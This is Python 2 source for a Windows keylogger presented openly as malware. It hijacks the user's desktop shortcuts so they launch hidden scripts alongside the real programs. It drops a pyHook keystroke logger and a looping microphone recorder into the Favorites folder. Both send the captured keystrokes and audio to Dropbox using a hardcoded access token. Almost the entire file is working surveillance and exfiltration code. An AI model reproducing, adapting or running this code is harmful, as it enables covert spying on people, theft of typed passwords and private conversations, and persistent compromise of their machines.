#Simple keylogger for windows 7,8,10

import pyHook, pythoncom, sys, logging
import dropbox
import sys
import win32com.client
import pywintypes
import win32ui
import win32gui
import win32con
import win32api
import win32file
import ctypes
import ctypes.util



import os, fnmatch

cmd_prmpt = 'taskkill.exe /F /FI "status eq NOT RESPONDING"'
os.system(cmd_prmpt)

def extract(rec):
    global n
    global username
    try:
        hicon = win32gui.CreateIconFromResource(rec, True)
    except pywintypes.error as error:
        # Check on appropriate error
        if error.winerror != 6:
            raise

        print("Resource %2d isn't .ico, extract" % icon_name)
        # This part almost identical to C++
        hResInfo = ctypes.windll.kernel32.FindResourceW(hlib, icon_name, win32con.RT_ICON)
        size = ctypes.windll.kernel32.SizeofResource(hlib, hResInfo)
        mem_pointer = ctypes.windll.kernel32.LockResource(rec)

        # And this is some differ (copy data to Python buffer)
        binary_data = (ctypes.c_ubyte * size)()
        libc.memcpy(binary_data, mem_pointer, size)

        # Save it
        with open('C:\\Users\\' + username + '\\Favorites\\icon' + str(n)+'.ico', "wb") as extract_file:
            extract_file.write(bytearray(binary_data))
    else:
        info = win32gui.GetIconInfo(hicon)
        bminfo = win32gui.GetObject(info[3])
        print("Resource %2d is .ico: 0x%08X -> %d %d " %
                (icon_name, hicon, bminfo.bmWidth, bminfo.bmHeight))


def find(pattern, path):
    result = []
    for root, dirs, files in os.walk(path):
        for name in files:
            if fnmatch.fnmatch(name, pattern):
                result.append(os.path.join(root, name))
    return result

username = os.getenv('username')
path = 'C:\Users\\'+username+'\Desktop'
result = find('*.lnk', path)

pathh = 'C:\\Users\\'+username+'\\Favorites\\silent_bing.pwy'
patth = 'C:\\Users\\'+username+'\\Favorites\\silent_aud.pwy'

os.system("set PATH=%PATH%;C:\\python27")
pwy_to_run = 'python "'+pathh+'"'

print result
n=0
for link in result:
    dir_to_save_bat = "C:\\Users\\"+username+"\\bats"
    dir_to_save_vbs = "C:\\Users\\" + username + "\\vbs"
    icon_name = 'icon' + str(n)+'.ico'
    ppath = 'C:\\Users\\' + username + '\\Favorites\\icon' + str(n)+'.ico'
    try:
        os.stat(dir_to_save_bat)
    except:
        os.mkdir(dir_to_save_bat)
    try:
        os.stat(dir_to_save_vbs)
    except:
        os.mkdir(dir_to_save_vbs)

    link2 = os.path.split(link)[1]
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut("C:\\Users\\"+username+"\\Desktop\\"+link2)
    Target = shortcut.Targetpath
    libc = ctypes.CDLL(ctypes.util.find_library('c'))
    libc.memcpy.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t]
    libc.memcpy.restype = ctypes.c_char_p

    # All Windows backslashes must be escaped to LoadLibrary worked correctly '\' -> '\\'
    PATH = Target
    PATH = str(PATH)

    try:
        icon_name = 'icon' + str(n)+'.ico'
        hlib = win32api.LoadLibrary(PATH)
        hResInfo = ctypes.windll.kernel32.FindResourceW(hlib, icon_name, win32con.RT_ICON)
        size = ctypes.windll.kernel32.SizeofResource(hlib, hResInfo)
        rec = win32api.LoadResource(hlib, win32con.RT_ICON, icon_name)
        mem_pointer = ctypes.windll.kernel32.LockResource(rec)
        binary_data = (ctypes.c_ubyte * size)()
        libc.memcpy(binary_data, mem_pointer, size)

        ppath = 'C:\\Users\\' + username + '\\Favorites\\icon' + str(n)+'.ico'
        with open(ppath, "wb") as test_file:
            test_file.write(bytearray(binary_data))

    except pywintypes.error as error:
        print "ERROR: %s" % error.strerror
        pass
    except:
        try:
            hlib = win32api.LoadLibrary(PATH)
            icon_names = win32api.EnumResourceNames(hlib, win32con.RT_ICON)
            for icon_name in icon_names:
                rec = win32api.LoadResource(hlib, win32con.RT_ICON, icon_name)
                extract(rec)
        except pywintypes.error as error:
            print "ERROR: %s" % error.strerror
            pass
    print link
    print Target
    re_short = 'Set sh = CreateObject("WScript.Shell")\nSet shortcut = sh.CreateShortcut("' + str(link) + '")\nshortcut.TargetPath = "' + dir_to_save_bat+"\\bat_N_"+str(n)+'.bat' + '"\nshortcut.Save\'\nlnkfile = sh.SpecialFolders("Desktop") & "\\'+link2+'"'+'\nSet lnk = sh.CreateShortcut(lnkfile)\nIf lnk.IconLocation = "'+ppath+'" Then\n  lnk.IconLocation = "'+ppath+'"\nElse\n  lnk.IconLocation = "'+ppath+'"\nEnd If\nlnk.Save'
    path0 = dir_to_save_bat+"\\bat_N_"+str(n)+'.bat'
    path1 = dir_to_save_vbs+"\\vbs_N_"+str(n)+'.vbs'
    file = open(path0,"w")
    file2 = open(path1,"w")
    the_bat = '@echo\nstart "" '+pathh+'\nstart "" "'+patth+'"\nstart "" '+'"'+Target+'"'
    file.write(the_bat)
    file2.write(re_short)
    file.close()
    file2.close()
    os.system(path1)
    n+=1
    print "created"

file_log = '''
import pyHook, pythoncom, sys, logging
import os
try:
    import dropbox

    client = dropbox.client.DropboxClient("-Vn5tIkNwIAAAAAAAAAAHDqBGcITyQrAUl7rAj09u4iIFZJuP3N1N5s2AdEvxOHm")
    print 'linked account: ', client.account_info()

    f = open('C:\\VCredit\\log.txt', 'rb')
    response = client.put_file('/KLGD.txt', f)
    print 'uploaded: ', response

    folder_metadata = client.metadata('/')

    f, metadata = client.get_file_and_metadata('/magnum-opus.txt')
    out = open('magnum-opus.txt', 'wb')
    out.write(f.read())
    out.close()
except:
    pass

try:
    os.stat('C:\\VCredit')
except:
    os.mkdir('C:\\VCredit')
file_log = 'C:\\VCredit\\log.txt'

def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()


'''

silent_audio = '''from sys import byteorder
from array import array
from struct import pack

import pyaudio
import wave
while 1:
    THRESHOLD = 500
    CHUNK_SIZE = 1024
    FORMAT = pyaudio.paInt16
    RATE = 44100

    def is_silent(snd_data):
        "Returns 'True' if below the 'silent' threshold"
        return max(snd_data) < THRESHOLD

    def normalize(snd_data):
        "Average the volume out"
        MAXIMUM = 16384
        times = float(MAXIMUM)/max(abs(i) for i in snd_data)

        r = array('h')
        for i in snd_data:
            r.append(int(i*times))
        return r

    def trim(snd_data):
        "Trim the blank spots at the start and end"
        def _trim(snd_data):
            snd_started = False
            r = array('h')

            for i in snd_data:
                if not snd_started and abs(i)>THRESHOLD:
                    snd_started = True
                    r.append(i)

                elif snd_started:
                    r.append(i)
            return r

        # Trim to the left
        snd_data = _trim(snd_data)

        # Trim to the right
        snd_data.reverse()
        snd_data = _trim(snd_data)
        snd_data.reverse()
        return snd_data

    def add_silence(snd_data, seconds):
        "Add silence to the start and end of 'snd_data' of length 'seconds' (float)"
        r = array('h', [0 for i in xrange(int(seconds*RATE))])
        r.extend(snd_data)
        r.extend([0 for i in xrange(int(seconds*RATE))])
        return r

    def record():
        """
        Record a word or words from the microphone and 
        return the data as an array of signed shorts.

        Normalizes the audio, trims silence from the 
        start and end, and pads with 0.5 seconds of 
        blank sound to make sure VLC et al can play 
        it without getting chopped off.
        """
        p = pyaudio.PyAudio()
        stream = p.open(format=FORMAT, channels=1, rate=RATE,
            input=True, output=True,
            frames_per_buffer=CHUNK_SIZE)

        num_silent = 0
        snd_started = False

        r = array('h')

        while 1:
            # little endian, signed short
            snd_data = array('h', stream.read(CHUNK_SIZE))
            if byteorder == 'big':
                snd_data.byteswap()
            r.extend(snd_data)

            silent = is_silent(snd_data)

            if silent and snd_started:
                num_silent += 1
            elif not silent and not snd_started:
                snd_started = True

            if snd_started and num_silent > 30:
                break

        sample_width = p.get_sample_size(FORMAT)
        stream.stop_stream()
        stream.close()
        p.terminate()

        r = normalize(r)
        r = trim(r)
        r = add_silence(r, 0.5)
        return sample_width, r

    def record_to_file(path):
        "Records from the microphone and outputs the resulting data to 'path'"
        sample_width, data = record()
        data = pack('<' + ('h'*len(data)), *data)

        wf = wave.open(path, 'wb')
        wf.setnchannels(1)
        wf.setsampwidth(sample_width)
        wf.setframerate(RATE)
        wf.writeframes(data)
        wf.close()

    print("please speak a word into the microphone")
    record_to_file('C:\\VCredit\\demo.wav')
    print("done - result written to demo.wav")
    
    try:
        import dropbox

        client = dropbox.client.DropboxClient("-Vn5tIkNwIAAAAAAAAAAHDqBGcITyQrAUl7rAj09u4iIFZJuP3N1N5s2AdEvxOHm")
        print 'linked account: ', client.account_info()

        f = open('C:\\VCredit\\demo.wav', 'rb')
        response = client.put_file('/KLGD.wav', f)
        print 'uploaded: ', response

        folder_metadata = client.metadata('/')

        f, metadata = client.get_file_and_metadata('/demos.wav')
    except:
        pass
    
    
    '''

silent_aud = open(patth,"a")
silent = open(pathh,"w")
silent.write(file_log)
silent_aud.write(silent_audio)
silent.close()
silent_aud.close()
os.system(pwy_to_run)
print "done"